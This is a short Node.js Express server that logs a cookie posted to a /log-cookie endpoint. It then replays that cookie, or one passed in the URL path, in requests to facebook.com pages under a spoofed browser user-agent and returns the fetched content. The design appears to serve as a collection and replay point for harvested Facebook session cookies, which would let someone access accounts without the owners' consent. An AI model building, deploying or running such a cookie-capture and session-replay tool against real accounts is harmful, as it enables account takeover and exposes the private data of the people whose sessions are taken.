const express = require('express');
const axios = require('axios');

const app = express();
app.use(express.json());

/* =========================
   COOKIE STORE (IN MEMORY)
========================= */
let fbCookie = null;

function setCookie(cookie) {
    fbCookie = cookie;
}

function getCookie() {
    return fbCookie;
}

/* =========================
   HOME
========================= */
app.get('/', (req, res) => {
    res.send('CAP API RUNNING');
});

/* =========================
   LOG COOKIE API
========================= */
app.post('/log-cookie', (req, res) => {
    const { cookie } = req.body;

    if (!cookie) {
        return res.status(400).json({
            error: "missing cookie"
        });
    }

    setCookie(cookie);

    console.log("🍪 COOKIE SAVED");

    return res.json({
        status: "ok",
        message: "cookie saved"
    });
});

/* =========================
   SCREENSHOT / CAP ROUTE
========================= */
app.get('/screenshot/:uid/:cookies', async (req, res) => {
    try {
        const { uid, cookies } = req.params;

        // ưu tiên cookie đã log, fallback param
        const finalCookies = getCookie() || cookies;

        if (!finalCookies) {
            return res.status(400).json({
                error: "no cookie available"
            });
        }

        const options = {
            method: 'GET',
            url: `https://facebook.com/${uid}/`,
            headers: {
                'authority': 'business.facebook.com',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'en-US,en;q=0.9',
                'sec-fetch-site': 'none',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'Cookie': finalCookies
            }
        };

        const response = await axios(options);

        return res.send(response.data);

    } catch (error) {
        return res.status(500).json({
            error: error.message
        });
    }
});

/* =========================
   404 FIX
========================= */
app.use((req, res) => {
    res.status(404).json({
        error: "File not found",
        path: req.originalUrl
    });
});

/* =========================
   START SERVER
========================= */
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
    console.log("let go");
});
